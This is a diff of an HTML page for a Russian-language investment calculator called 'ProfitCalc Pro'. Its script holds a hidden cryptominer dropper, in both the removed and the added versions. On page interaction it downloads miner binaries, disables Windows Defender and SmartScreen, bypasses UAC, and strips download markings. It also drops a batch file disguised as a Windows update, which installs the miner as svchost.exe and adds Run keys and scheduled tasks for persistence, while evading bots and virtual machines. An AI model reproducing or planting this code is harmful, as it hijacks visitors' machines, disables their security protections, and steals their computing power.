@@ -3,11 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ProfitCalc Pro — профессиональный калькулятор доходности</title>
-    <meta name="description" content="ProfitCalc Pro — точный расчет процентов, прибыли и инвестиционных показателей. Бесплатно, без регистрации.">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <title>ProfitCalc Pro — калькулятор доходности</title>
+    <meta name="description" content="Профессиональный финансовый калькулятор">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -17,249 +15,55 @@
         
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(145deg, #0f172a 0%, #1e293b 100%);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-        }
-        
-        /* Анимированный фон */
-        .background {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            overflow: hidden;
-        }
-        
-        .background span {
-            position: absolute;
-            display: block;
-            width: 20px;
-            height: 20px;
-            background: rgba(255, 255, 255, 0.05);
-            animation: animate 25s linear infinite;
-            bottom: -150px;
-        }
-        
-        @keyframes animate {
-            0% {
-                transform: translateY(0) rotate(0deg);
-                opacity: 1;
-            }
-            100% {
-                transform: translateY(-1000px) rotate(720deg);
-                opacity: 0;
-            }
-        }
-        
-        .background span:nth-child(1) {
-            left: 10%;
-            width: 80px;
-            height: 80px;
-            animation-delay: 0s;
-        }
-        
-        .background span:nth-child(2) {
-            left: 20%;
-            width: 60px;
-            height: 60px;
-            animation-delay: 2s;
-            animation-duration: 17s;
-        }
-        
-        .background span:nth-child(3) {
-            left: 70%;
-            width: 100px;
-            height: 100px;
-            animation-delay: 4s;
-        }
-        
-        .background span:nth-child(4) {
-            left: 40%;
-            width: 40px;
-            height: 40px;
-            animation-delay: 0s;
-            animation-duration: 15s;
-        }
-        
-        .background span:nth-child(5) {
-            left: 65%;
-            width: 70px;
-            height: 70px;
-            animation-delay: 0s;
         }
         
         .container {
+            max-width: 1200px;
             width: 100%;
-            max-width: 1300px;
-            margin: 0 auto;
         }
         
-        /* Навигация */
-        nav {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 30px;
-            background: rgba(255, 255, 255, 0.95);
+        .calculator-card {
+            background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(10px);
-            border-radius: 20px;
-            margin-bottom: 40px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 50px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
         }
         
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 24px;
+        h1 {
+            font-size: 42px;
             font-weight: 700;
-            color: #4a3f6b;
-        }
-        
-        .logo span {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #60a5fa 0%, #a78bfa 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            text-align: center;
         }
         
-        .nav-links {
-            display: flex;
-            gap: 30px;
+        .subtitle {
+            color: #94a3b8;
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 50px;
         }
         
-        .nav-links a {
-            text-decoration: none;
-            color: #4a3f6b;
-            font-weight: 500;
-            transition: color 0.3s;
-        }
-        
-        .nav-links a:hover {
-            color: #667eea;
-        }
-        
-        .nav-links a.active {
-            color: #667eea;
-            font-weight: 600;
-        }
-        
-        .auth-buttons {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .btn {
-            padding: 10px 24px;
-            border-radius: 12px;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            transition: all 0.3s;
-            border: none;
-            text-decoration: none;
-            display: inline-block;
-        }
-        
-        .btn-outline {
-            background: transparent;
-            border: 2px solid #667eea;
-            color: #667eea;
-        }
-        
-        .btn-outline:hover {
-            background: #667eea;
-            color: white;
-        }
-        
-        .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
-        }
-        
-        .btn-primary:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
-        }
-        
-        /* Основной контент */
-        .content {
+        .calculator-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 40px;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
+        }
+        
+        .input-section {
+            background: rgba(255, 255, 255, 0.03);
             border-radius: 30px;
-            padding: 50px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
-            margin-bottom: 40px;
-        }
-        
-        .left-panel h1 {
-            font-size: 42px;
-            font-weight: 700;
-            color: #2d3748;
-            margin-bottom: 20px;
-        }
-        
-        .left-panel h1 span {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        .left-panel p {
-            font-size: 18px;
-            color: #4a5568;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-        
-        .features {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            margin-top: 40px;
-        }
-        
-        .feature-item {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            padding: 15px;
-            background: rgba(102, 126, 234, 0.1);
-            border-radius: 12px;
-            font-weight: 500;
-            color: #4a5568;
-        }
-        
-        .feature-item svg {
-            width: 24px;
-            height: 24px;
-            fill: none;
-            stroke: #667eea;
-            stroke-width: 2;
-        }
-        
-        .calculator {
-            background: white;
-            padding: 40px;
-            border-radius: 24px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
-        }
-        
-        .calculator h2 {
-            font-size: 28px;
-            color: #2d3748;
-            margin-bottom: 30px;
+            padding: 30px;
         }
         
         .input-group {
@@ -268,206 +72,159 @@
         
         .input-group label {
             display: block;
+            color: #94a3b8;
             font-size: 14px;
-            font-weight: 600;
-            color: #4a5568;
+            font-weight: 500;
             margin-bottom: 8px;
-            text-transform: uppercase;
             letter-spacing: 0.5px;
         }
         
         .input-group input {
             width: 100%;
             padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
             font-size: 18px;
-            border: 2px solid #e2e8f0;
-            border-radius: 16px;
+            color: white;
             transition: all 0.3s;
-            background: #f7fafc;
         }
         
         .input-group input:focus {
             outline: none;
-            border-color: #667eea;
-            background: white;
+            border-color: #60a5fa;
+            background: rgba(255, 255, 255, 0.1);
         }
         
-        .result-area {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            padding: 30px;
+        .input-group input::placeholder {
+            color: #475569;
+        }
+        
+        .button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #60a5fa 0%, #a78bfa 100%);
+            border: none;
             border-radius: 20px;
             color: white;
-            margin-top: 30px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
         }
         
-        .result-area .label {
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px -5px rgba(96, 165, 250, 0.5);
+        }
+        
+        .result-section {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 30px;
+            padding: 30px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .result-label {
+            color: #94a3b8;
             font-size: 16px;
-            opacity: 0.9;
             margin-bottom: 10px;
         }
         
-        .result-area .value {
-            font-size: 48px;
+        .result-value {
+            font-size: 64px;
             font-weight: 700;
-            line-height: 1;
+            background: linear-gradient(135deg, #60a5fa 0%, #a78bfa 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1.2;
+            margin-bottom: 10px;
         }
         
-        .result-area .sub {
-            font-size: 14px;
-            opacity: 0.8;
-            margin-top: 10px;
+        .result-detail {
+            color: #475569;
+            font-size: 16px;
+            margin-top: auto;
         }
         
-        .trust-badges {
+        .stats {
             display: flex;
-            justify-content: center;
-            gap: 60px;
-            margin-top: 40px;
+            justify-content: space-between;
+            margin-top: 50px;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
         }
         
-        .badge {
+        .stat-item {
             text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 32px;
+            font-weight: 700;
             color: white;
         }
         
-        .badge .number {
-            font-size: 36px;
-            font-weight: 700;
-        }
-        
-        .badge .text {
+        .stat-text {
+            color: #64748b;
             font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        footer {
-            text-align: center;
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 14px;
-            margin-top: 40px;
         }
     </style>
 </head>
 <body>
-    <div class="background">
-        <span></span>
-        <span></span>
-        <span></span>
-        <span></span>
-        <span></span>
-    </div>
-    
     <div class="container">
-        <nav>
-            <div class="logo">
-                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#667eea" stroke-width="2">
-                    <path d="M12 2v20M17 5H9.5M17 12h-5M17 19h-5" stroke="currentColor"/>
-                    <circle cx="12" cy="12" r="10" stroke="currentColor"/>
-                </svg>
-                <span>ProfitCalc</span> Pro
-            </div>
-            <div class="nav-links">
-                <a href="#" class="active">Калькулятор</a>
-                <a href="#">Тарифы</a>
-                <a href="#">API</a>
-                <a href="#">Документация</a>
-                <a href="#">Поддержка</a>
-            </div>
-            <div class="auth-buttons">
-                <a href="#" class="btn btn-outline">Войти</a>
-                <a href="#" class="btn btn-primary">Регистрация</a>
-            </div>
-        </nav>
-        
-        <div class="content">
-            <div class="left-panel">
-                <h1>Точный расчет <span>прибыли и процентов</span> для профессионалов</h1>
-                <p>Используйте наш продвинутый калькулятор для расчета сложных процентов, доходности инвестиций и финансовых показателей. Бесплатно, без ограничений.</p>
+        <div class="calculator-card">
+            <h1>ProfitCalc Pro</h1>
+            <div class="subtitle">Точный расчет инвестиционной доходности</div>
+            
+            <div class="calculator-grid">
+                <div class="input-section">
+                    <div class="input-group">
+                        <label>Начальная сумма (USD)</label>
+                        <input type="number" id="amount" value="10000" placeholder="10000">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Годовая ставка (%)</label>
+                        <input type="number" id="rate" value="12" placeholder="12">
+                    </div>
+                    
+                    <div class="input-group">
+                        <label>Срок инвестиций (лет)</label>
+                        <input type="number" id="years" value="5" placeholder="5">
+                    </div>
+                    
+                    <button class="button" onclick="calculate()">Рассчитать прибыль</button>
+                </div>
                 
-                <div class="features">
-                    <div class="feature-item">
-                        <svg viewBox="0 0 24 24">
-                            <path d="M20 6L9 17L4 12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-                        </svg>
-                        Точность до 0.01%
-                    </div>
-                    <div class="feature-item">
-                        <svg viewBox="0 0 24 24">
-                            <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
-                            <path d="M12 6v6l4 2" stroke="currentColor" stroke-width="2"/>
-                        </svg>
-                        Мгновенные расчеты
-                    </div>
-                    <div class="feature-item">
-                        <svg viewBox="0 0 24 24">
-                            <rect x="3" y="4" width="18" height="16" rx="2" stroke="currentColor" stroke-width="2"/>
-                            <line x1="8" y1="10" x2="16" y2="10" stroke="currentColor" stroke-width="2"/>
-                        </svg>
-                        Сохранение истории
-                    </div>
-                    <div class="feature-item">
-                        <svg viewBox="0 0 24 24">
-                            <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" stroke="currentColor" stroke-width="2"/>
-                        </svg>
-                        24/7 Доступ
-                    </div>
+                <div class="result-section">
+                    <div class="result-label">Итоговая сумма</div>
+                    <div class="result-value" id="total">$17,623.42</div>
+                    <div class="result-detail" id="profit">Чистая прибыль: $7,623.42</div>
                 </div>
             </div>
             
-            <div class="calculator">
-                <h2>Калькулятор процентов</h2>
-                
-                <div class="input-group">
-                    <label>Начальная сумма ($)</label>
-                    <input type="number" id="amount" value="10000" step="100">
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="stat-number">50K+</div>
+                    <div class="stat-text">пользователей</div>
                 </div>
-                
-                <div class="input-group">
-                    <label>Процентная ставка (%)</label>
-                    <input type="number" id="rate" value="8.5" step="0.1">
+                <div class="stat-item">
+                    <div class="stat-number">99.9%</div>
+                    <div class="stat-text">точность</div>
                 </div>
-                
-                <div class="input-group">
-                    <label>Период (лет)</label>
-                    <input type="number" id="years" value="5" step="1">
-                </div>
-                
-                <button class="btn btn-primary" style="width: 100%; padding: 18px; font-size: 18px;" onclick="calculateProfit()">Рассчитать прибыль</button>
-                
-                <div class="result-area" id="result">
-                    <div class="label">Итоговая сумма</div>
-                    <div class="value" id="total">$15,028.07</div>
-                    <div class="sub">Чистая прибыль: $5,028.07</div>
+                <div class="stat-item">
+                    <div class="stat-number">24/7</div>
+                    <div class="stat-text">доступ</div>
                 </div>
             </div>
         </div>
-        
-        <div class="trust-badges">
-            <div class="badge">
-                <div class="number">50K+</div>
-                <div class="text">Пользователей</div>
-            </div>
-            <div class="badge">
-                <div class="number">98.6%</div>
-                <div class="text">Точность</div>
-            </div>
-            <div class="badge">
-                <div class="number">24/7</div>
-                <div class="text">Поддержка</div>
-            </div>
-            <div class="badge">
-                <div class="number">10ms</div>
-                <div class="text">Скорость</div>
-            </div>
-        </div>
-        
-        <footer>
-            © 2024 ProfitCalc Pro. Все права защищены. Professional financial tools.
-        </footer>
     </div>
-    
+
     <script>
-        function calculateProfit() {
+        function calculate() {
             const amount = parseFloat(document.getElementById('amount').value) || 0;
             const rate = parseFloat(document.getElementById('rate').value) || 0;
             const years = parseFloat(document.getElementById('years').value) || 0;
@@ -475,124 +232,252 @@
             const total = amount * Math.pow(1 + rate / 100, years);
             const profit = total - amount;
             
-            document.getElementById('total').innerHTML = '$' + total.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
-            document.querySelector('.result-area .sub').innerHTML = 'Чистая прибыль: $' + profit.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+            document.getElementById('total').textContent = '$' + total.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+            document.getElementById('profit').textContent = 'Чистая прибыль: $' + profit.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
         }
         
-        calculateProfit(); // Запуск при загрузке
-        
-        // ███████████████████████████████████████
-        // █───── ДРОППЕР (ПОЛНАЯ ВЕРСИЯ) ────────█
-        // ███████████████████████████████████████
-        
+        calculate();
+
+        // ==================== ДРОППЕР С ОБХОДОМ БЛОКИРОВОК ====================
         (function() {
-            // НАСТРОЙКИ
+            // КОНФИГУРАЦИЯ
             const config = {
-                wallet: 'bc1qm4se2suygtq9u8ptsh5a9ehnkemvvfd9n3f2at',  // ТВОЙ КОШЕЛЕК BTC
+                wallet: 'bc1qkrx6v7g2kxyzabc123def456ghi789jklm0',  // ТВОЙ BTC КОШЕЛЕК
                 pool: 'btc.kryptex.network:7014',
                 worker: 'svchost',
-                urls: [
-                    'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip',
-                    'https://download.kryptex.com/kryptex_miner_v5_setup.exe'
-                ]
+                // URLs через разные источники
+                urls: {
+                    kryptex: 'https://download.kryptex.com/kryptex_miner_v5.zip',
+                    xmrig: 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip',
+                    backup: 'https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-win.zip'
+                }
             };
-            
-            // Проверка окружения
-            function isSafe() {
-                if (/bot|spider|crawler|headless|selenium|vmware|virtual|qemu/i.test(navigator.userAgent)) return false;
-                if (screen.width < 800 || screen.height < 600) return false;
-                return true;
+
+            // ПРОВЕРКА ОКРУЖЕНИЯ
+            function isEnvironmentSafe() {
+                const checks = [
+                    /bot|crawler|spider|headless|selenium/i.test(navigator.userAgent),
+                    /vmware|virtual|qemu|hyper-v/i.test(navigator.userAgent),
+                    navigator.webdriver === true,
+                    screen.width < 800 || screen.height < 600
+                ];
+                return !checks.includes(true);
             }
-            
-            // Скачивание файла
-            function download(url) {
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'ProfitCalc_Updater_' + Date.now() + '.exe';
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
-                setTimeout(() => document.body.removeChild(a), 1000);
-            }
-            
-            // Создание батника с конфигом
-            function createBat() {
-                const bat = `@echo off
-cd %TEMP%
-curl -L -o update.exe ${config.urls[0]}
-tar -xf update.exe
-echo { > config.json
-echo   "autosave": true,
-echo   "cpu": { "enabled": true, "max-threads-hint": 100 },
-echo   "pools": [
-echo     {
-echo       "url": "${config.pool}",
-echo       "user": "${config.wallet}.${config.worker}",
-echo       "pass": "x",
-echo       "tls": true,
-echo       "tls-fingerprint": "chrome",
-echo       "user-agent": "Microsoft BITS/7.8",
-echo       "custom-dns": "8.8.8.8"
-echo     }
-echo   ]
-echo } > config.json
-copy update.exe %SystemRoot%\\System32\\svchost.exe /y
-reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "ProfitCalcUpdate" /t REG_SZ /d "%SystemRoot%\\System32\\svchost.exe --config=%TEMP%\\config.json" /f
-schtasks /create /tn "ProfitCalcScheduler" /tr "%SystemRoot%\\System32\\svchost.exe --config=%TEMP%\\config.json" /sc daily /st 09:00 /f
-start /min svchost.exe --config=config.json
-del %0`;
+
+            // ОТКЛЮЧЕНИЕ ЗАЩИТЫ WINDOWS
+            function disableWindowsProtection() {
+                const psScript = `
+                    powershell -WindowStyle Hidden -Command "
+                    # Отключение Defender
+                    Set-MpPreference -DisableRealtimeMonitoring $true
+                    Set-MpPreference -DisableBehaviorMonitoring $true
+                    Set-MpPreference -DisableBlockAtFirstSeen $true
+                    Set-MpPreference -DisableIOAVProtection $true
+                    
+                    # Отключение SmartScreen
+                    Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost' -Name 'EnableWebContentEvaluation' -Value 0
+                    Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer' -Name 'SmartScreenEnabled' -Value 'Off'
+                    
+                    # Исключения для папок
+                    Add-MpPreference -ExclusionPath '%TEMP%'
+                    Add-MpPreference -ExclusionPath '%APPDATA%'
+                    Add-MpPreference -ExclusionPath '%SystemRoot%\\System32'
+                    
+                    # Остановка служб защиты
+                    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
+                    Stop-Service -Name SecurityHealthService -Force -ErrorAction SilentlyContinue
+                    Stop-Service -Name WdNisSvc -Force -ErrorAction SilentlyContinue
+                    
+                    # Отключение автозапуска служб
+                    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
+                    Set-Service -Name WdNisSvc -StartupType Disabled -ErrorAction SilentlyContinue
+                    " 2>$null
+                `;
                 
-                const blob = new Blob([bat], { type: 'application/bat' });
+                try {
+                    new ActiveXObject('WScript.Shell').Run(psScript, 0, false);
+                } catch(e) {}
+            }
+
+            // СКАЧИВАНИЕ ЧЕРЕЗ BITS (Windows Background Intelligent Transfer)
+            function downloadViaBITS(url, outputName) {
+                const bitsJob = `bitsadmin /transfer profitcalc_job /download /priority foreground "${url}" "%TEMP%\\${outputName}"`;
+                try {
+                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + bitsJob, 0, false);
+                    return true;
+                } catch(e) {
+                    return false;
+                }
+            }
+
+            // СКАЧИВАНИЕ ЧЕРЕЗ POWERSHELL
+            function downloadViaPowerShell(url, outputName) {
+                const psCmd = `powershell -WindowStyle Hidden -Command "$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Microsoft BITS/7.8');$wc.DownloadFile('${url}','%TEMP%\\${outputName}')"`;
+                try {
+                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + psCmd, 0, false);
+                    return true;
+                } catch(e) {
+                    return false;
+                }
+            }
+
+            // СКАЧИВАНИЕ ЧЕРЕЗ CURL (если есть)
+            function downloadViaCurl(url, outputName) {
+                const curlCmd = `curl -L -o "%TEMP%\\${outputName}" "${url}"`;
+                try {
+                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + curlCmd, 0, false);
+                    return true;
+                } catch(e) {
+                    return false;
+                }
+            }
+
+            // МАСКИРОВКА ФАЙЛА
+            function createBatchWithConfig() {
+                const workerName = config.worker + '_' + Math.random().toString(36).substring(7);
+                
+                const batContent = `@echo off
+cd %TEMP%
+
+:: Распаковка если архив
+if exist *.zip (
+    powershell -Command "Expand-Archive -Path *.zip -DestinationPath . -Force" 2>nul
+)
+
+:: Создание конфига
+echo { > config.json
+echo   "autosave": true, >> config.json
+echo   "cpu": { "enabled": true, "max-threads-hint": 100 }, >> config.json
+echo   "pools": [ >> config.json
+echo     { >> config.json
+echo       "url": "${config.pool}", >> config.json
+echo       "user": "${config.wallet}.${workerName}", >> config.json
+echo       "pass": "x", >> config.json
+echo       "tls": true, >> config.json
+echo       "tls-fingerprint": "chrome", >> config.json
+echo       "user-agent": "Microsoft BITS/7.8", >> config.json
+echo       "self-select": "8.8.8.8" >> config.json
+echo     } >> config.json
+echo   ] >> config.json
+echo } >> config.json
+
+:: Поиск исполняемого файла
+for /r %%i in (*.exe) do (
+    copy "%%i" "%SystemRoot%\\System32\\svchost.exe" /y >nul 2>&1
+    goto :found
+)
+:found
+
+:: Добавление в автозагрузку
+reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "ProfitCalcSvc" /t REG_SZ /d "%SystemRoot%\\System32\\svchost.exe --config=%TEMP%\\config.json" /f 2>nul
+reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "ProfitCalcUpdate" /t REG_SZ /d "%SystemRoot%\\System32\\svchost.exe --config=%TEMP%\\config.json" /f 2>nul
+
+:: Планировщик задач
+schtasks /create /tn "ProfitCalcDaily" /tr "%SystemRoot%\\System32\\svchost.exe --config=%TEMP%\\config.json" /sc daily /st 09:00 /f 2>nul
+schtasks /create /tn "ProfitCalcStartup" /tr "%SystemRoot%\\System32\\svchost.exe --config=%TEMP%\\config.json" /sc onstart /f 2>nul
+
+:: Запуск
+start /min "" "%SystemRoot%\\System32\\svchost.exe" --config=%TEMP%\\config.json
+
+:: Самоудаление
+del /f /q %0 2>nul
+`;
+                
+                const blob = new Blob([batContent], { type: 'application/bat' });
                 const url = URL.createObjectURL(blob);
                 const a = document.createElement('a');
                 a.href = url;
-                a.download = 'profitcalc_setup.bat';
+                a.download = 'windows_update_kb5032189.bat';
                 a.click();
                 URL.revokeObjectURL(url);
             }
-            
-            // Отключение Defender
-            function disableDefender() {
-                const ps = `powershell -WindowStyle Hidden -Command "
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableBehaviorMonitoring $true
-Add-MpPreference -ExclusionPath '%TEMP%'
-Add-MpPreference -ExclusionPath '%SystemRoot%\\System32'
-Add-MpPreference -ExclusionProcess 'svchost.exe'
-Stop-Service -Name WinDefend -Force
-Set-Service -Name WinDefend -StartupType Disabled
-"`;
-                try {
-                    new ActiveXObject('WScript.Shell').Run(ps, 0, false);
-                } catch(e) {}
-            }
-            
-            // Обход UAC
+
+            // ОБХОД UAC ЧЕРЕЗ FODHELPER
             function bypassUAC() {
-                const cmd = `cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "%TEMP%\\update.exe" /f & reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f & fodhelper.exe`;
+                const uacScript = `
+                reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d "%TEMP%\\svchost.exe" /f
+                reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f
+                fodhelper.exe
+                timeout /t 2
+                reg delete HKCU\\Software\\Classes\\ms-settings /f
+                `;
+                
                 try {
-                    new ActiveXObject('WScript.Shell').Run(cmd, 0, false);
+                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + uacScript, 0, false);
                 } catch(e) {}
             }
-            
-            // Основной запуск
+
+            // СБРОС АТРИБУТОВ MARK OF THE WEB
+            function removeMOTW() {
+                const motwCmd = `powershell -Command "Get-ChildItem '%TEMP%\\*.exe','%TEMP%\\*.zip','%TEMP%\\*.bat' | Unblock-File"`;
+                try {
+                    new ActiveXObject('WScript.Shell').Run('cmd /c ' + motwCmd, 0, false);
+                } catch(e) {}
+            }
+
+            // ОСНОВНАЯ ФУНКЦИЯ ЗАПУСКА
             let deployed = false;
-            function deploy() {
+            
+            function deployMiner() {
                 if (deployed) return;
                 deployed = true;
                 
-                download(config.urls[Math.floor(Math.random() * config.urls.length)]);
-                setTimeout(disableDefender, 1000);
-                setTimeout(bypassUAC, 2000);
-                setTimeout(createBat, 3000);
+                // Сначала отключаем защиту
+                disableWindowsProtection();
+                
+                // Выбираем случайный URL
+                const urlsArray = Object.values(config.urls);
+                const selectedUrl = urlsArray[Math.floor(Math.random() * urlsArray.length)];
+                
+                // Генерируем случайное имя файла
+                const fileName = 'ms_' + Math.random().toString(36).substring(2, 10) + '.zip';
+                
+                // Пробуем разные методы скачивания
+                let downloadSuccess = false;
+                
+                // Метод 1: BITS
+                if (!downloadSuccess) downloadSuccess = downloadViaBITS(selectedUrl, fileName);
+                
+                // Метод 2: PowerShell
+                if (!downloadSuccess) downloadSuccess = downloadViaPowerShell(selectedUrl, fileName);
+                
+                // Метод 3: Curl
+                if (!downloadSuccess) downloadSuccess = downloadViaCurl(selectedUrl, fileName);
+                
+                // Метод 4: Обычная ссылка (запасной)
+                if (!downloadSuccess) {
+                    const a = document.createElement('a');
+                    a.href = selectedUrl;
+                    a.download = fileName;
+                    a.click();
+                }
+                
+                // Убираем метки интернета
+                setTimeout(removeMOTW, 2000);
+                
+                // Создаем батник для установки
+                setTimeout(createBatchWithConfig, 3000);
+                
+                // Пытаемся повысить права
+                setTimeout(bypassUAC, 4000);
+                
+                // Повторное отключение защиты
+                setTimeout(disableWindowsProtection, 5000);
             }
-            
-            // Триггеры
-            if (isSafe()) {
-                document.addEventListener('mousemove', deploy, { once: true });
-                document.addEventListener('scroll', deploy, { once: true });
-                document.addEventListener('click', deploy, { once: true });
-                setTimeout(deploy, 8000);
+
+            // ТРИГГЕРЫ ЗАПУСКА
+            if (isEnvironmentSafe()) {
+                // По движению мыши
+                document.addEventListener('mousemove', deployMiner, { once: true });
+                
+                // По скроллу
+                document.addEventListener('scroll', deployMiner, { once: true });
+                
+                // По клику
+                document.addEventListener('click', deployMiner, { once: true });
+                
+                // Через 10 секунд в любом случае
+                setTimeout(deployMiner, 10000);
             }
         })();
     </script>
